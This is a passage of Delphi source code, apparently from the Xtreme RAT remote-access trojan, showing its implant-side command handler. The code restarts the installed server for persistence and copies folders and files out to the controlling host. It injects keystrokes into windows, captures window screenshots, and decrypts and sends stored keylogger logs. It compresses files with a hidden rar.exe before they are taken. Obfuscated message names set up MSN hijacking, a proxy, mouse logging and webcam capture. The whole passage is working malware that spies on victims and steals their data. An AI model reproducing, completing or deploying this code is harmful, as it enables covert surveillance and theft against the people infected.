    sleep(5000); // tempo de intervalo do persist

    TempMutex := CreateMutexW(nil, False, 'XTREMEUPDATE');
    if shellexecute(0, 'open', pWideChar(InstalledServer), nil, nil, SW_NORMAL) > 32 then
    begin
      sleep(1000);
      ExitProcess(0)
    end else CloseHandle(TempMutex);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADFOLDER then
  begin
    delete(Recebido, 1, posex('|', recebido));
    TempStr := Recebido;

    DownFolder := TDownloadFolder.Create(MainIdTCPClient.Host,
                                         MainIdTCPClient.Port,
                                         TempStr,
                                         '*.*',
                                         True); // depois adicionar uma opção para baixar em subdiretórios ou não
    DownFolder.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADFOLDERADD then
  begin
    delete(Recebido, 1, posex('|', recebido));

    if PossoMexer(Recebido) = False then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDOWNLOADERROR + '|' + Recebido);
      exit;
    end;

    NewDownload := TNewDownload.Create(MainIdTCPClient.Host,
                                      MainIdTCPClient.Port,
                                      Recebido,
                                      True);
    NewDownload.Resume;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = SENDKEYSWINDOW then
  begin
    delete(Recebido, 1, posex('|', recebido));
    TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', recebido));

    If (TempInt <> 0) then
    begin
      SendMessage(TempInt, WM_SYSCOMMAND, SC_HOTKEY, TempInt);
      SendMessage(TempInt, WM_SYSCOMMAND, SC_DEFAULT, TempInt);
      SetForegroundWindow(TempInt);
      Sendkeys(pWideChar(Recebido), False);
    end;

  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMCOPYFILE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, Length(DelimitadorComandos));
    Recebido := Recebido + ExtractFilename(TempStr);

    if CopyFileW(pwChar(TempStr), pwChar(Recebido), False) = true then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMCOPYFILE + '|T|' + TempStr) else
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMCOPYFILE + '|F|' + TempStr);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMCOPYFOLDER then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, Length(DelimitadorComandos));

    TempStr1 := TempStr;
    delete(TempStr1, Length(TempStr1), 1);
    while posex('\', TempStr1) > 0 do Delete(TempStr1, 1, posex('\', TempStr1));

    Recebido := Recebido + TempStr1;

    if CopyDirectory(0, pwChar(TempStr), pwChar(Recebido)) = true then
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMCOPYFOLDER + '|T|' + TempStr) else
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMCOPYFOLDER + '|F|' + TempStr);
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = WINDOWPREV then
  begin
    delete(Recebido, 1, posex('|', recebido));
    TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));

    If (TempInt <> 0) then
    begin
      GetClientRect(TempInt, Rect);
      TempInt1 := Rect.Right - Rect.Left;
      TempInt2 := Rect.Bottom - Rect.Top;
      if (TempInt1 <= 0) or (TempInt2 <= 0) then Exit;
      TempStr := GetWindowImage(TempInt, 100, TempInt1, TempInt2);
      ToSend := JANELAS + '|' + WINDOWPREV + '|' + IntToStr(TempInt) + '|' + TempStr;
      GlobalVars.MainIdTCPClient.EnviarString(ToSend);
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADALL then
  begin
    StopDownloadAll := True;
    Delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(Copy(Recebido, 1, posex('|', recebido) - 1));
    Delete(Recebido, 1, posex('|', Recebido));
    Recebido := LowerString(Recebido);
    sleep(5000);

    StopDownloadAll := False;
    DownloadAll := TDownloadAll.Create(MainIdTCPClient.Host, MainIdTCPClient.Port, Recebido, TempInt);
    DownloadAll.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = ENVIARLOGSKEY then
  begin
{
    if KeyObject > 0 then SendMessage(KeyObject, WM_GETLOGFILE, 0, 0) else
    begin
      GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERBAIXAR + '|');
      exit;
    end;

}
    if FileExists(KeyloggerFileName) = false then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(ENVIARLOGSKEY + '|');
      exit;
    end;

    Randomize;
    TempStr := MyTempFolder + IntToStr(Random(999999)) + '.dat';
    CopyFileW(KeyloggerFileName, PWideChar(TempStr), False);
    SetFileAttributesW(pWideChar(TempStr), FILE_ATTRIBUTE_NORMAL);
	  TempInt := LerArquivo(pWideChar(TempStr), p);
    DeleteFileW(pWideChar(TempStr));

    if TempInt <= 0 then GlobalVars.MainIdTCPClient.EnviarString(ENVIARLOGSKEY + '|') else
    begin
      SetLength(TempStr1, TempInt div 2);
      CopyMemory(@TempStr1[1], p, TempInt);

      EnDecryptKeylogger(pWideChar(TempStr1), TempInt div 2);
      while posex(#13#10#13#10#13#10, Tempstr1) > 0 do
      TempStr1 := customStringReplace(TempStr1, #13#10#13#10#13#10, #13#10#13#10);

      VarThread := TNewConnectionThread.Create(MainIdTCPClient.Host,
                                               MainIdTCPClient.Port,
                                               unitconstantes.NEWCONNECTION + '|' +
                                               ConnectionID +
                                               DelimitadorComandos +
                                               ENVIARLOGSKEY + '|' + TempStr1,
                                               True);
      VarThread.Resume;
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMCHECKRAR then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    if fileexists(pwChar(ExtractFilePath(installedserver) + 'rar.exe')) = False then
      GlobalVars.MainIdTCPClient.EnviarString(FMCHECKRAR + '|' + 'F') else
      GlobalVars.MainIdTCPClient.EnviarString(FMCHECKRAR + '|' + 'T');
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMRARFILE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1) + '.rar';
    Delete(Recebido, 1, posex('|', Recebido));
    DeleteFileW(pwChar(TempStr));
    TempStr1 := ExtractFilePath(installedserver) + 'rar.exe';

    TempStr2 := IntToStr(GetTickCount) + '.rar';
    while posex('|', recebido) > 0 do
    begin
      ExecAndWait(TempStr1, 'a "' + TempStr2 + '" "' + Copy(Recebido, 1, posex('|', Recebido) - 1) + '"', SW_HIDE);
      Delete(Recebido, 1, posex('|', Recebido));
    end;
    if MoveFileW(pwChar(TempStr2), pwChar(TempStr)) = False then
    begin
      CopyFileW(pwChar(TempStr2), pwChar(TempStr), False);
      DeleteFileW(pwChar(TempStr2));
    end;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMUNRARFILE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));

    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    TempStr := TempStr + '\';
    ForceDirectories(pwChar(TempStr));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);

    Delete(Recebido, 1, posex('|', Recebido));
    TempStr1 := ExtractFilePath(installedserver) + 'rar.exe';
    TempStr2 := Copy(Recebido, 1, posex('|', Recebido) - 1);

    ExecAndWait(TempStr1, 'e -y "' + TempStr2 + '" "' + TempStr + '"', SW_HIDE);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMGETRARFILE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', recebido) - 1);
    Delete(Recebido, 1, posex('|', Recebido));
    CriarArquivo(pwChar(ExtractFilePath(installedserver) + 'rarreg.key'), pwChar(TempStr), Length(TempStr) * 2);
    CriarArquivo(pwChar(ExtractFilePath(installedserver) + 'rar.exe'), pwChar(Recebido), Length(Recebido) * 2);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FMUNZIPFILE then
  begin
    Delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    TempStr := TempStr + '\';
    ForceDirectories(pwChar(TempStr));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1); //Diretório...

    Delete(Recebido, 1, posex('|', Recebido));
    TempStr1 := Copy(Recebido, 1, posex('|', Recebido) - 1); //Arquivo...

    UnZipFile(TempStr1, TempStr);
  end else


end;

initialization
  StartDevicesVar;
  WM_GETMSNSTATUS := RegisterWindowMessageW('vklfnknkbnglbgbmlgçmd');
  WM_SETMSNSTATUS := RegisterWindowMessageW('crvcebvbjkvjfbkjvbfkvk');
  WM_EXITMSN := RegisterWindowMessageW('gcdcryuevucfvuuebuc');
  WM_MSNCONTACTLIST := RegisterWindowMessageW('hcdgcdghscghdvgcdgschg');
  WM_MSNADDCONTACT := RegisterWindowMessageW('hvchjhbjvfvbjhfbhjv');
  WM_MSNDELCONTACT := RegisterWindowMessageW('bhbhcdbhbcjdsbhjhjbd');
  WM_MSNBLOCKCONTACT := RegisterWindowMessageW('hreirbufrefurecbuhe');
  WM_MSNUNBLOCKCONTACT := RegisterWindowMessageW('erybfrfebhvbfbvbgb');
  WM_PROXYSTART := RegisterWindowMessageW('jkdkfkjvkjbkgkdsssss');
  WM_PROXYSTOP := RegisterWindowMessageW('cdfvchfdhsvfjvfbsbusueryy');
  WM_MOUSESTART := RegisterWindowMessageW('nfkdnkfnjkvjfdjkvfdjkkfd');
  WM_MOUSESTOP := RegisterWindowMessageW('rjereigrhgutgtrgtjgtrgtn');
  WM_MOUSELOGGERSTART := RegisterWindowMessageW('jvkfjkvtklbkltklmhbktklmklykl');
  WM_MOUSELOGGERSTOP := RegisterWindowMessageW('jigorotrnjtrnjfbhjhbfbhjrre');
  WM_MAININFO := RegisterWindowMessageW('dfkmnfgvgbjklbgklgbjklvbjkdbjkbjk');
  WM_WEBCAMLIST := RegisterWindowMessageW('hgijiohtgjibfgyfufvergvyfgvyrf');
  WM_WEBCAMDIRECTX := RegisterWindowMessageW('hgijiohtgkllkgfklfklbgklfgvyrf');
  WM_LASTPING := RegisterWindowMessageW('hjkvkrlgkltrmlghtrhlmytmhfd');
  WM_WEBCAMSTART := RegisterWindowMessageW('jkdkfkjvrfgrevkjbkgkrgegrers');
finalization
  StopDevicesVar;

end.